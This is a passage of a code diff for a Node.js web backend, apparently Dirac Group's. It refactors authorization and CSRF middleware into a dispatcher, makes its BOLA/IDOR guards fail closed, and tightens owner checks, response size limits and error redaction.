 const DIRAC_BOLA_IDOR_GLOBAL_HARD_BAN_STORE_V128 = globalThis.__DIRAC_BOLA_IDOR_GLOBAL_HARD_BAN_STORE_V128__ || new Map();
 globalThis.__DIRAC_BOLA_IDOR_GLOBAL_HARD_BAN_STORE_V128__ = DIRAC_BOLA_IDOR_GLOBAL_HARD_BAN_STORE_V128;
 
@@ -20724,7 +25071,7 @@ try {
   const __diracBolaIdorV128OriginalSupabaseFetch = typeof supabaseFetch === 'function' ? supabaseFetch : null;
   if (__diracBolaIdorV128OriginalSupabaseFetch && !__diracBolaIdorV128OriginalSupabaseFetch.__diracBolaIdorV128Wrapped) {
     supabaseFetch = async function supabaseFetchBolaIdorGlobalHardBanV128(path, options = {}) {
-      const decision = await diracBolaIdorV128InspectSupabaseAccess(path, options).catch(() => ({ ok: true }));
+      const decision = await diracBolaIdorV128InspectSupabaseAccess(path, options).catch((error) => ({ ok: false, warn: true, block: true, reason: 'bola_idor_v128_supabase_guard_exception', error: diracSecurityRedactDiagnosticV210(error, 120) }));
       if (decision && decision.warn) diracBolaIdorV128LogDecision(decision);
       if (decision && decision.block) {
         await diracBolaIdorV128RegisterGlobalHardBanFromContext(decision).catch(() => null);
@@ -20739,20 +25086,20 @@ try {
 } catch (_) {}
 
 try {
-  const __diracBolaIdorV128PreviousHandler = module.exports;
+  const __diracBolaIdorV128PreviousHandler = __diracV202DispatcherSentinel;
   if (typeof __diracBolaIdorV128PreviousHandler === 'function' && !__diracBolaIdorV128PreviousHandler.__diracBolaIdorV128Wrapped) {
-    module.exports = async function diracBolaIdorGlobalHardBanWrapperV128(req, res) {
+    __diracV202RegisterMiddleware(async function diracBolaIdorGlobalHardBanWrapperV128(req, res, nextHandlerV202) {
       const context = diracBolaIdorV128BuildRequestContext(req);
       const run = async () => {
         try { if (res && typeof res.setHeader === 'function') res.setHeader('X-Dirac-Bola-Idor-Patch-V128', DIRAC_BOLA_IDOR_GLOBAL_HARD_BAN_PATCH_V128); } catch (_) {}
 
-        const decision = await diracBolaIdorV128InspectHttpRequest(req).catch(() => ({ ok: true }));
+        const decision = await diracBolaIdorV128InspectHttpRequest(req).catch((error) => ({ ok: false, warn: true, block: true, reason: 'bola_idor_v128_http_guard_exception', error: diracSecurityRedactDiagnosticV210(error, 120) }));
         if (decision && decision.warn) diracBolaIdorV128LogDecision(decision);
         if (decision && decision.block) {
           await diracBolaIdorV128RegisterGlobalHardBan(req, context.action, context.method, decision).catch(() => null);
           return diracBolaIdorV128BlockedHttpResponse(res, decision.reason || 'BOLA_IDOR_BLOCKED');
         }
-        return __diracBolaIdorV128PreviousHandler(req, res);
+        return nextHandlerV202(req, res);
       };
 
       if (diracBolaIdorAsyncLocalV128 && typeof diracBolaIdorAsyncLocalV128.run === 'function') {
@@ -20760,8 +25107,8 @@ try {
       }
       try { if (req && typeof req === 'object') req.__diracBolaIdorContextV128 = context; } catch (_) {}
       return run();
-    };
-    Object.defineProperty(module.exports, '__diracBolaIdorV128Wrapped', { value: true, enumerable: false });
+    }, "diracBolaIdorGlobalHardBanWrapperV128");
+    __diracV202MarkWrapperFlag("__diracBolaIdorV128Wrapped");
   }
 } catch (_) {}
 
@@ -20776,7 +25123,8 @@ function diracBolaIdorV128BuildRequestContext(req) {
     raw_action: rawAction.slice(0, 120),
     method: String(req && req.method || 'GET').toUpperCase().slice(0, 12),
     started_at: Date.now(),
-    allowedCustomerIdsV128: []
+    allowedCustomerIdsV128: [],
+    ownerRowsCacheV128: new Map()
   };
 }
 
@@ -20794,6 +25142,108 @@ function diracBolaIdorV128CurrentContext() {
   return null;
 }
 
+
+function diracBolaIdorV128CentralOwnerBootstrapDecisionV213(path, options = {}, legacyCtx = null, decisionPhase = 'legacy_wrapper') {
+  const centralCtx = typeof diracCentralCurrentContextV149 === 'function' ? diracCentralCurrentContextV149() : null;
+  const binding = centralCtx && centralCtx.__diracCentralOwnerBootstrapBindingV213;
+  const checkoutStage26V216 = diracCentralCheckoutStage26BootstrapModeV216(centralCtx, centralCtx && centralCtx.req);
+  if (!centralCtx || !binding || (centralCtx.__diracCentralOwnerScopeResolvingV146 !== true && !checkoutStage26V216)) {
+    return { relevant: false, ok: false };
+  }
+
+  const record = (ok, code, failurePoint) => {
+    centralCtx.ownerBootstrapDebugV213 = {
+      patch: DIRAC_CENTRAL_OWNER_BOOTSTRAP_PATCH_V213,
+      result: ok ? 'allowed' : 'rejected',
+      diagnostic_code: String(code || '').slice(0, 120),
+      failure_point: String(failurePoint || '').slice(0, 160),
+      action: String(centralCtx.action || '').slice(0, 80),
+      method: String(options && options.method || 'GET').toUpperCase().slice(0, 12),
+      full_central_guard_passed: Boolean(centralCtx.centralGuardFullyPassedV211),
+      checkout_stage26_pre_idor: checkoutStage26V216,
+      decision_phase: String(decisionPhase || '').slice(0, 40),
+      owner_scope_resolving: centralCtx.__diracCentralOwnerScopeResolvingV146 === true,
+      safe_service_role_fetch: centralCtx.__diracCentralSafeServiceRoleFetchV146 === true,
+      auth_user_binding_present: Boolean(binding && binding.authUserId)
+    };
+    return { relevant: true, ok, code };
+  };
+
+  const req = legacyCtx && legacyCtx.req;
+  if (!req || centralCtx.req !== req) return record(false, 'OWNER_BOOTSTRAP_REQUEST_CONTEXT_MISMATCH', 'v128.bootstrap.request_context');
+  if (!checkoutStage26V216 && (typeof diracCentralHandlerContextFullyPassedV211 !== 'function'
+      || !diracCentralHandlerContextFullyPassedV211(centralCtx, req))) {
+    return record(false, 'OWNER_BOOTSTRAP_FULL_CENTRAL_GUARD_REQUIRED', 'v128.bootstrap.central_passport');
+  }
+  if (String(decisionPhase || '') !== 'central_gateway' && centralCtx.__diracCentralSafeServiceRoleFetchV146 !== true) {
+    return record(false, 'OWNER_BOOTSTRAP_SECURE_DATABASE_GATEWAY_REQUIRED', 'v128.bootstrap.database_gateway');
+  }
+
+  const action = diracBolaIdorV128NormalizeAction(legacyCtx && legacyCtx.action || centralCtx.action || '');
+  if (checkoutStage26V216 && !diracCentralVerifiedOwnerActionV217(action)) {
+    return record(false, 'OWNER_BOOTSTRAP_ACTION_NOT_ALLOWED', 'v128.bootstrap.action');
+  }
+  if (!checkoutStage26V216 && action !== 'domain_me' && !diracCentralVerifiedOwnerActionV217(action)) {
+    return record(false, 'OWNER_BOOTSTRAP_ACTION_NOT_ALLOWED', 'v128.bootstrap.action');
+  }
+  if (action !== diracBolaIdorV128NormalizeAction(binding.action || '')) {
+    return record(false, 'OWNER_BOOTSTRAP_ACTION_BINDING_MISMATCH', 'v128.bootstrap.action_binding');
+  }
+
+  const method = String(options && options.method || 'GET').toUpperCase();
+  if (method !== 'GET') return record(false, 'OWNER_BOOTSTRAP_GET_ONLY', 'v128.bootstrap.method');
+  if (options && options.auth !== 'service') return record(false, 'OWNER_BOOTSTRAP_SERVICE_ROLE_REQUIRED', 'v128.bootstrap.auth_mode');
+  if (options && options.body !== undefined && options.body !== null) return record(false, 'OWNER_BOOTSTRAP_BODY_FORBIDDEN', 'v128.bootstrap.body');
+
+  const rawPath = String(path || '');
+  const queryIndex = rawPath.indexOf('?');
+  if (checkoutStage26V216 && (queryIndex <= 0 || rawPath.slice(0, queryIndex) !== '/rest/v1/security_customer_auth_links')) {
+    return { relevant: false, ok: false };
+  }
+  if (queryIndex <= 0 || rawPath.slice(0, queryIndex) !== '/rest/v1/security_customer_auth_links') {
+    return record(false, 'OWNER_BOOTSTRAP_TABLE_OR_PATH_INVALID', 'v128.bootstrap.path');
+  }
+
+  let params;
+  try {
+    params = new URLSearchParams(rawPath.slice(queryIndex + 1));
+  } catch (_) {
+    return record(false, 'OWNER_BOOTSTRAP_QUERY_PARSE_FAILED', 'v128.bootstrap.query_parse');
+  }
+
+  const allowedKeys = new Set(['select', 'auth_user_id', 'link_status', 'disabled_at', 'revoked_at', 'order', 'limit']);
+  const keys = Array.from(params.keys());
+  if (keys.length !== allowedKeys.size || keys.some((key) => !allowedKeys.has(String(key || '')))) {
+    return record(false, 'OWNER_BOOTSTRAP_QUERY_KEYS_INVALID', 'v128.bootstrap.query_keys');
+  }
+  if (Array.from(allowedKeys).some((key) => params.getAll(key).length !== 1)) {
+    return record(false, 'OWNER_BOOTSTRAP_QUERY_KEY_DUPLICATE_OR_MISSING', 'v128.bootstrap.query_cardinality');
+  }
+
+  const expectedSelect = 'id,auth_user_id,customer_id,email,link_status,match_confidence,disabled_at,revoked_at,updated_at';
+  if (params.get('select') !== expectedSelect) return record(false, 'OWNER_BOOTSTRAP_SELECT_CONTRACT_INVALID', 'v128.bootstrap.select');
+  if (params.get('link_status') !== 'eq.active') return record(false, 'OWNER_BOOTSTRAP_ACTIVE_FILTER_REQUIRED', 'v128.bootstrap.link_status');
+  if (params.get('disabled_at') !== 'is.null') return record(false, 'OWNER_BOOTSTRAP_DISABLED_NULL_REQUIRED', 'v128.bootstrap.disabled_at');
+  if (params.get('revoked_at') !== 'is.null') return record(false, 'OWNER_BOOTSTRAP_REVOKED_NULL_REQUIRED', 'v128.bootstrap.revoked_at');
+  if (params.get('order') !== 'updated_at.desc') return record(false, 'OWNER_BOOTSTRAP_ORDER_INVALID', 'v128.bootstrap.order');
+  if (params.get('limit') !== '2') return record(false, 'OWNER_BOOTSTRAP_LIMIT_INVALID', 'v128.bootstrap.limit');
+
+  const authFilter = String(params.get('auth_user_id') || '');
+  if (!authFilter.startsWith('eq.')) return record(false, 'OWNER_BOOTSTRAP_AUTH_FILTER_INVALID', 'v128.bootstrap.auth_user_id_filter');
+  const requestedAuthUserId = authFilter.slice(3).trim();
+  const boundAuthUserId = String(binding.authUserId || '').trim();
+  if (!diracBolaIdorV128LooksLikeUuid(requestedAuthUserId)
+      || !diracBolaIdorV128LooksLikeUuid(boundAuthUserId)
+      || requestedAuthUserId !== boundAuthUserId) {
+    return record(false, 'OWNER_BOOTSTRAP_AUTH_USER_BINDING_MISMATCH', 'v128.bootstrap.auth_user_id_binding');
+  }
+  if (String(binding.requestId || '') !== String(centralCtx.requestId || '')) {
+    return record(false, 'OWNER_BOOTSTRAP_REQUEST_ID_BINDING_MISMATCH', 'v128.bootstrap.request_id_binding');
+  }
+
+  return record(true, 'OWNER_BOOTSTRAP_EXACT_SELF_READ_ALLOWED', 'v128.bootstrap.exact_contract');
+}
+
 async function diracBolaIdorV128InspectHttpRequest(req) {
   const method = String(req && req.method || 'GET').toUpperCase();
   const action = diracBolaIdorV128NormalizeAction(String(req && req.query && req.query.action || ''));
@@ -20804,7 +25254,7 @@ async function diracBolaIdorV128InspectHttpRequest(req) {
   if (!ids.length) return { ok: true };
 
   const owner = await diracBolaIdorV128ResolveRequestOwner(req).catch(() => null);
-  if (!owner || !owner.ok) return { ok: true, reason: 'request_owner_unavailable_fail_safe' };
+  if (!owner || !owner.ok) return diracBolaIdorV128BuildBlockDecision('request_owner_required', { source: 'query', action, method });
 
   const customerMismatch = diracBolaIdorV128FindCustomerMismatch(ids, owner.customerIds);
   if (customerMismatch) {
@@ -20862,8 +25312,13 @@ async function diracBolaIdorV128InspectSupabaseAccess(path, options = {}) {
   if (!action || diracBolaIdorV128ShouldSkipAction(action, method, ctx.req)) return { ok: true };
   if (!diracBolaIdorV128IsProtectedUserObjectAction(action)) return { ok: true };
 
+  const ownerBootstrapV213 = diracBolaIdorV128CentralOwnerBootstrapDecisionV213(rawPath, options, ctx);
+  if (ownerBootstrapV213 && ownerBootstrapV213.ok === true) {
+    return { ok: true, skipped: 'central_passed_exact_owner_bootstrap_v213' };
+  }
+
   const allowed = diracBolaIdorV128AllowedCustomerIds(ctx);
-  if (!allowed.length) return { ok: true, reason: 'trusted_owner_not_yet_available' };
+  if (!allowed.length) return diracBolaIdorV128BuildBlockDecision('trusted_owner_required', { source: 'supabase', table, method, action });
 
   const ids = diracBolaIdorV128CollectIdsFromSupabase(rawPath, options.body);
   const customerMismatch = diracBolaIdorV128FindCustomerMismatch(ids, allowed);
@@ -20933,6 +25388,13 @@ function diracBolaIdorV128ShouldSkipAction(action, method, req) {
 
   const clean = String(action || '').toLowerCase();
   if (!clean) return false;
+
+  // CHECKOUT CENTRAL-GUARD NARROW FIX v160:
+  // Setelah checkout_order sudah lulus seluruh Central Guard v146, jangan ulangi
+  // resolver BOLA/IDOR legacy v128 yang melakukan owner lookup lintas banyak tabel.
+  // Tanpa passport Central Guard, legacy v128 tetap aktif seperti sebelumnya.
+  if (req && req.__diracCentralSecurityGuardPassedV146 === true && clean === 'checkout_order') return true;
+
   if (/^(domain_health|hostinger_check|domain_check|midtrans_health)$/i.test(clean)) return true;
   if (/login|register|logout|midtrans|ipaymu|webhook|callback|notification|payment_gateway|payment_notification|a2f|mfa|passkey|password|hash|email|mail|csrf|token/i.test(clean)) return true;
   if (/^(create_payment|pay_order|order_payment|create_payment_order)$/i.test(clean)) return true;
@@ -21066,6 +25528,17 @@ async function diracBolaIdorV128ResolveRequestOwner(req) {
   const ctx = diracBolaIdorV128CurrentContext();
   if (ctx && ctx.ownerResolvedV128) return ctx.ownerResolvedV128;
 
+  const verifiedOwnerV215 = typeof diracCentralOwnerFromVerifiedContextV215 === 'function'
+    ? diracCentralOwnerFromVerifiedContextV215(req)
+    : null;
+  if (verifiedOwnerV215) {
+    if (ctx && typeof ctx === 'object') {
+      ctx.ownerResolvedV128 = verifiedOwnerV215;
+      ctx.allowedCustomerIdsV128 = Array.from(verifiedOwnerV215.customerIds);
+    }
+    return verifiedOwnerV215;
+  }
+
   if (typeof requireDomainUser !== 'function' || typeof customerSecurityFetchAuthLink !== 'function') return { ok: false };
   const fakeRes = diracBolaIdorV128FakeResponse();
   const user = await requireDomainUser(req, fakeRes).catch(() => null);
@@ -21140,17 +25613,28 @@ async function diracBolaIdorV128ResolveChildParentOwners(childTable, parentIds) 
 async function diracBolaIdorV128ResolveKnownObjectOwners(objectIds, preferredTable) {
   const ids = Array.from(new Set((objectIds || []).filter(diracBolaIdorV128LooksLikeUuid))).slice(0, 40);
   if (!ids.length) return [];
-  const tables = [];
+
   const preferred = String(preferredTable || '').toLowerCase();
-  if (preferred && diracBolaIdorV128DirectOwnerTable(preferred)) tables.push(preferred);
-  ['orders', 'domain_orders', 'security_customer_sessions', 'security_customer_settings', 'security_customer_recovery_codes', 'payment_transactions']
-    .forEach((table) => { if (!tables.includes(table)) tables.push(table); });
+  const hasExactPreferredTable = Boolean(preferred && diracBolaIdorV128DirectOwnerTable(preferred));
+  const tables = hasExactPreferredTable
+    ? [preferred]
+    : ['orders', 'domain_orders', 'security_customer_sessions', 'security_customer_settings', 'security_customer_recovery_codes', 'payment_transactions'];
+
+  const ctx = diracBolaIdorV128CurrentContext();
+  const cache = ctx && ctx.ownerRowsCacheV128 instanceof Map ? ctx.ownerRowsCacheV128 : null;
+  const cacheKey = (hasExactPreferredTable ? preferred : '*') + ':' + ids.slice().sort().join(',');
+  if (cache && cache.has(cacheKey)) {
+    const cachedRows = cache.get(cacheKey);
+    return Array.isArray(cachedRows) ? cachedRows.map((row) => ({ ...row })) : [];
+  }
 
   const rows = [];
-  for (const table of tables.slice(0, 6)) {
+  for (const table of tables) {
     const fetched = await diracBolaIdorV128FetchOwnerRows(table, ids, 'id').catch(() => []);
     rows.push(...fetched);
   }
+
+  if (cache) cache.set(cacheKey, rows.map((row) => ({ ...row })));
   return rows;
 }
 
@@ -21209,7 +25693,7 @@ async function diracBolaIdorV128DirectSupabaseServiceGet(path) {
   let text = '';
   try {
     response = await fetch(url + String(path || ''), fetchOptions);
-    text = await response.text();
+    text = await diracReadResponseTextLimitedV210(response, 2 * 1024 * 1024);
   } catch (error) {
     return {
       ok: false,
@@ -21734,7 +26218,7 @@ async function orderMailSendViaProviderFallbackSafeV129(config, message) {
           html: String(message.html || '<p>Dirac Group</p>')
         })
       });
-      const body = await response.json().catch(() => ({}));
+      const body = await parseFetchResponse(response, 256 * 1024).catch(() => ({}));
       if (response.ok) return { ok: true, provider: 'resend', id: body && body.id || null, recipient_count: recipients.length };
       return { ok: false, provider: 'resend', error: 'resend_' + response.status };
     } catch (error) {
@@ -21763,7 +26247,7 @@ async function orderMailSendViaProviderFallbackSafeV129(config, message) {
           htmlContent: String(message.html || '<p>Dirac Group</p>')
         })
       });
-      const body = await response.json().catch(() => ({}));
+      const body = await parseFetchResponse(response, 256 * 1024).catch(() => ({}));
       if (response.ok) return { ok: true, provider: 'brevo', id: body && body.messageId || null, recipient_count: recipients.length };
       return { ok: false, provider: 'brevo', error: 'brevo_' + response.status };
     } catch (error) {
@@ -21774,11 +26258,11 @@ async function orderMailSendViaProviderFallbackSafeV129(config, message) {
   return { ok: false, error: 'smtp_or_provider_not_configured' };
 }
 
-const __diracOwnerPaidEmailSenderHealthPreviousHandlerV129 = module.exports;
-module.exports = async function diracOwnerPaidEmailSenderHealthWrapperV129(req, res) {
+const __diracOwnerPaidEmailSenderHealthPreviousHandlerV129 = __diracV202DispatcherSentinel;
+__diracV202RegisterMiddleware(async function diracOwnerPaidEmailSenderHealthWrapperV129(req, res, nextHandlerV202) {
   const rawAction = String((req && req.query && req.query.action) || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
   if (rawAction !== 'order_mail_health' && rawAction !== 'order_email_health') {
-    return __diracOwnerPaidEmailSenderHealthPreviousHandlerV129(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -21797,7 +26281,7 @@ module.exports = async function diracOwnerPaidEmailSenderHealthWrapperV129(req, 
     adminPanelCodeUntouched: true,
     note: 'Owner email dikirim oleh sender order-mail hanya setelah paid webhook. Endpoint, template, login/register/logout/hash/A2F/payment gateway tidak diubah. Secret/app password tidak ditampilkan.'
   });
-};
+}, "diracOwnerPaidEmailSenderHealthWrapperV129");
 
 
 /* ============================================================
@@ -21960,6 +26444,10 @@ function readDiracSupabaseCredentials(targetKey) {
   const anonKey = String(process.env[envs.anonKey] || '').trim();
   const serviceKey = String(process.env[envs.serviceKey] || '').trim();
 
+  if (key === 'security' && (!url || !anonKey || !serviceKey)) {
+    throw new Error(`Missing dedicated security Supabase ENV: ${envs.url}, ${envs.anonKey}, ${envs.serviceKey}`);
+  }
+
   if (url && anonKey && serviceKey) {
     return {
       targetKey: key,
@@ -21987,13 +26475,13 @@ function readDiracSupabaseCredentials(targetKey) {
 }
 
 try {
-  const __diracV131PreviousHandler = module.exports;
+  const __diracV131PreviousHandler = __diracV202DispatcherSentinel;
   if (typeof __diracV131PreviousHandler === 'function' && !__diracV131PreviousHandler.__diracAuthRegisterSafeBolaRepairV131) {
-    module.exports = async function diracAuthRegisterSafeBolaRepairWrapperV131(req, res) {
+    __diracV202RegisterMiddleware(async function diracAuthRegisterSafeBolaRepairWrapperV131(req, res, nextHandlerV202) {
       try { if (res && typeof res.setHeader === 'function') res.setHeader('X-Dirac-Auth-Register-Safe-Bola-Repair', DIRAC_AUTH_REGISTER_SAFE_BOLA_REPAIR_PATCH_V131); } catch (_) {}
-      return __diracV131PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracAuthRegisterSafeBolaRepairV131', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracAuthRegisterSafeBolaRepairWrapperV131");
+    __diracV202MarkWrapperFlag("__diracAuthRegisterSafeBolaRepairV131");
   }
 } catch (_) {}
 
@@ -22033,15 +26521,15 @@ try {
 } catch (_) {}
 
 try {
-  const __diracBolaIdorV132PreviousHandler = module.exports;
+  const __diracBolaIdorV132PreviousHandler = __diracV202DispatcherSentinel;
   if (typeof __diracBolaIdorV132PreviousHandler === 'function' && !__diracBolaIdorV132PreviousHandler.__diracBolaIdorV132Wrapped) {
-    module.exports = async function diracBolaIdorHighAssuranceWrapperV132(req, res) {
+    __diracV202RegisterMiddleware(async function diracBolaIdorHighAssuranceWrapperV132(req, res, nextHandlerV202) {
       try { if (res && typeof res.setHeader === 'function') res.setHeader('X-Dirac-Bola-Idor-High-Assurance', DIRAC_BOLA_IDOR_HIGH_ASSURANCE_PATCH_V132); } catch (_) {}
       const decision = await diracBolaIdorV132InspectHttpQuery(req).catch(() => ({ ok: true }));
       if (decision && decision.block) return diracBolaIdorV132BlockedHttpResponse(res, decision);
-      return __diracBolaIdorV132PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracBolaIdorV132Wrapped', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracBolaIdorHighAssuranceWrapperV132");
+    __diracV202MarkWrapperFlag("__diracBolaIdorV132Wrapped");
   }
 } catch (_) {}
 
@@ -22534,16 +27022,16 @@ try {
 } catch (_) {}
 
 try {
-  const __diracBolaIdorV133PreviousHandler = module.exports;
+  const __diracBolaIdorV133PreviousHandler = __diracV202DispatcherSentinel;
   if (typeof __diracBolaIdorV133PreviousHandler === 'function' && !__diracBolaIdorV133PreviousHandler.__diracBolaIdorV133Wrapped) {
-    module.exports = async function diracBolaIdorCustomerLinkHardBindingWrapperV133(req, res) {
+    __diracV202RegisterMiddleware(async function diracBolaIdorCustomerLinkHardBindingWrapperV133(req, res, nextHandlerV202) {
       try { if (res && typeof res.setHeader === 'function') res.setHeader('X-Dirac-Bola-Idor-Customer-Link-Binding', DIRAC_BOLA_IDOR_CUSTOMER_LINK_HARD_BINDING_PATCH_V133); } catch (_) {}
 
       const context = diracBolaIdorV133BuildRequestContext(req);
       const run = async () => {
         const decision = await diracBolaIdorV133InspectHttpRequest(req).catch(() => ({ ok: true }));
         if (decision && decision.block) return diracBolaIdorV133BlockedHttpResponse(res, decision);
-        return __diracBolaIdorV133PreviousHandler(req, res);
+        return nextHandlerV202(req, res);
       };
 
       if (diracBolaIdorAsyncLocalV133 && typeof diracBolaIdorAsyncLocalV133.run === 'function') {
@@ -22551,8 +27039,8 @@ try {
       }
       try { if (req && typeof req === 'object') req.__diracBolaIdorContextV133 = context; } catch (_) {}
       return run();
-    };
-    Object.defineProperty(module.exports, '__diracBolaIdorV133Wrapped', { value: true, enumerable: false });
+    }, "diracBolaIdorCustomerLinkHardBindingWrapperV133");
+    __diracV202MarkWrapperFlag("__diracBolaIdorV133Wrapped");
   }
 } catch (_) {}
 
@@ -22764,6 +27252,17 @@ function diracBolaIdorV133IsCentralPassedSelfSessionRead(action, method, table, 
 async function diracBolaIdorV133ResolveStrictOwner(req) {
   const ctx = diracBolaIdorV133CurrentContext();
   if (ctx && ctx.ownerResolvedV133) return ctx.ownerResolvedV133;
+
+  const verifiedOwnerV215 = typeof diracCentralOwnerFromVerifiedContextV215 === 'function'
+    ? diracCentralOwnerFromVerifiedContextV215(req)
+    : null;
+  if (verifiedOwnerV215) {
+    if (ctx && typeof ctx === 'object') {
+      ctx.ownerResolvedV133 = verifiedOwnerV215;
+      ctx.allowedCustomerIdsV133 = Array.from(verifiedOwnerV215.customerIds);
+    }
+    return verifiedOwnerV215;
+  }
 
   if (typeof requireDomainUser !== 'function') return { ok: false, reason: 'auth_user_unavailable' };
   const fakeRes = diracBolaIdorV133FakeResponse();
@@ -23256,9 +27755,9 @@ try {
 } catch (_) {}
 
 try {
-  const __diracV136PreviousHandler = module.exports;
+  const __diracV136PreviousHandler = __diracV202DispatcherSentinel;
   if (__diracV136PreviousHandler && !__diracV136PreviousHandler.__diracV136StrictWrapped) {
-    module.exports = async function diracBackendStrictSafeWrapperV136(req, res) {
+    __diracV202RegisterMiddleware(async function diracBackendStrictSafeWrapperV136(req, res, nextHandlerV202) {
       try { diracV136ApplyStrictResponseHeaders(res); } catch (_) {}
 
       const method = String((req && req.method) || '').toUpperCase();
@@ -23276,9 +27775,9 @@ try {
         }
       }
 
-      return __diracV136PreviousHandler(req, res);
-    };
-    module.exports.__diracV136StrictWrapped = true;
+      return nextHandlerV202(req, res);
+    }, "diracBackendStrictSafeWrapperV136");
+    __diracV202DispatcherSentinel.__diracV136StrictWrapped = true;
   }
 } catch (_) {}
 
@@ -23375,9 +27874,9 @@ function diracV136LooksLikeWeakPasswordPattern(password) {
 const DIRAC_CSRF_ALL_WEBSITE_ACTIONS_SAFE_V137 = 'dirac-csrf-all-website-actions-safe-v137';
 
 try {
-  const __diracV137PreviousHandler = module.exports;
+  const __diracV137PreviousHandler = __diracV202DispatcherSentinel;
   if (__diracV137PreviousHandler && !__diracV137PreviousHandler.__diracCsrfAllWebsiteV137Wrapped) {
-    module.exports = async function diracCsrfAllWebsiteActionsSafeWrapperV137(req, res) {
+    __diracV202RegisterMiddleware(async function diracCsrfAllWebsiteActionsSafeWrapperV137(req, res, nextHandlerV202) {
       const method = String((req && req.method) || 'GET').toUpperCase();
       const action = diracV137CsrfNormalizeAction((req && req.query && req.query.action) || '');
 
@@ -23410,9 +27909,9 @@ try {
         });
       }
 
-      return __diracV137PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracCsrfAllWebsiteV137Wrapped', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracCsrfAllWebsiteActionsSafeWrapperV137");
+    __diracV202MarkWrapperFlag("__diracCsrfAllWebsiteV137Wrapped");
   }
 } catch (_) {}
 
@@ -23536,9 +28035,7 @@ function diracV137CsrfEnvTrue(name) {
 }
 
 function diracV137CsrfSafeError(error) {
-  const message = String(error && error.message ? error.message : error || 'unknown').slice(0, 160);
-  if (/password|token|secret|cookie|authorization|service_role|apikey|csrf|hmac|hash/i.test(message)) return 'csrf_internal_error';
-  return message;
+  return diracSecurityRedactDiagnosticV210(error || 'csrf_internal_error', 160);
 }
 
 /* ============================================================
@@ -23557,9 +28054,9 @@ function diracV137CsrfSafeError(error) {
 const DIRAC_CSRF_EVERY_BROWSER_ACTION_STRICT_SAFE_V138 = 'dirac-csrf-every-browser-action-strict-safe-v138';
 
 try {
-  const __diracV138PreviousHandler = module.exports;
+  const __diracV138PreviousHandler = __diracV202DispatcherSentinel;
   if (__diracV138PreviousHandler && !__diracV138PreviousHandler.__diracCsrfEveryBrowserActionV138Wrapped) {
-    module.exports = async function diracCsrfEveryBrowserActionStrictSafeWrapperV138(req, res) {
+    __diracV202RegisterMiddleware(async function diracCsrfEveryBrowserActionStrictSafeWrapperV138(req, res, nextHandlerV202) {
       const method = String((req && req.method) || 'GET').toUpperCase();
       const action = diracV138CsrfNormalizeAction((req && req.query && req.query.action) || '');
 
@@ -23595,9 +28092,9 @@ try {
         });
       }
 
-      return __diracV138PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracCsrfEveryBrowserActionV138Wrapped', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracCsrfEveryBrowserActionStrictSafeWrapperV138");
+    __diracV202MarkWrapperFlag("__diracCsrfEveryBrowserActionV138Wrapped");
   }
 } catch (_) {}
 
@@ -23701,9 +28198,7 @@ function diracV138CsrfEnvTrue(name) {
 }
 
 function diracV138CsrfSafeError(error) {
-  const message = String(error && error.message ? error.message : error || 'unknown').slice(0, 160);
-  if (/password|token|secret|cookie|authorization|service_role|apikey|csrf|hmac|hash/i.test(message)) return 'csrf_internal_error';
-  return message;
+  return diracSecurityRedactDiagnosticV210(error || 'csrf_internal_error', 160);
 }
 
 
@@ -23740,17 +28235,17 @@ try {
 } catch (_) {}
 
 try {
-  const __diracV141PreviousHandler = module.exports;
+  const __diracV141PreviousHandler = __diracV202DispatcherSentinel;
   if (__diracV141PreviousHandler && !__diracV141PreviousHandler.__diracV141PreauthWrapperHeader) {
-    module.exports = async function diracCsrfPreauthStrictCompatWrapperV141(req, res) {
+    __diracV202RegisterMiddleware(async function diracCsrfPreauthStrictCompatWrapperV141(req, res, nextHandlerV202) {
       try {
         if (res && typeof res.setHeader === 'function') {
           res.setHeader('X-Dirac-CSRF-Preauth-Compat', DIRAC_CSRF_PREAUTH_STRICT_COMPAT_V141);
         }
       } catch (_) {}
-      return __diracV141PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracV141PreauthWrapperHeader', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracCsrfPreauthStrictCompatWrapperV141");
+    __diracV202MarkWrapperFlag("__diracV141PreauthWrapperHeader");
   }
 } catch (_) {}
 
@@ -23836,17 +28331,17 @@ try {
 } catch (_) {}
 
 try {
-  const __diracV142PreviousHandler = module.exports;
+  const __diracV142PreviousHandler = __diracV202DispatcherSentinel;
   if (__diracV142PreviousHandler && !__diracV142PreviousHandler.__diracV142PasskeyCompatHeader) {
-    module.exports = async function diracCsrfPasskeyActionCompatWrapperV142(req, res) {
+    __diracV202RegisterMiddleware(async function diracCsrfPasskeyActionCompatWrapperV142(req, res, nextHandlerV202) {
       try {
         if (res && typeof res.setHeader === 'function') {
           res.setHeader('X-Dirac-CSRF-Passkey-Compat', DIRAC_CSRF_PASSKEY_ACTION_COMPAT_V142);
         }
       } catch (_) {}
-      return __diracV142PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracV142PasskeyCompatHeader', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracCsrfPasskeyActionCompatWrapperV142");
+    __diracV202MarkWrapperFlag("__diracV142PasskeyCompatHeader");
   }
 } catch (_) {}
 
@@ -23950,9 +28445,9 @@ try {
 } catch (_) {}
 
 try {
-  const __diracV143PreviousHandler = module.exports;
+  const __diracV143PreviousHandler = __diracV202DispatcherSentinel;
   if (__diracV143PreviousHandler && !__diracV143PreviousHandler.__diracV143Wrapped) {
-    module.exports = async function diracGlobalApiThreatGuardWrapperV143(req, res) {
+    __diracV202RegisterMiddleware(async function diracGlobalApiThreatGuardWrapperV143(req, res, nextHandlerV202) {
       const method = String((req && req.method) || 'GET').toUpperCase();
       const action = diracV143NormalizeAction((req && req.query && req.query.action) || '');
 
@@ -23960,7 +28455,7 @@ try {
         diracV143ApplyHeaders(res);
 
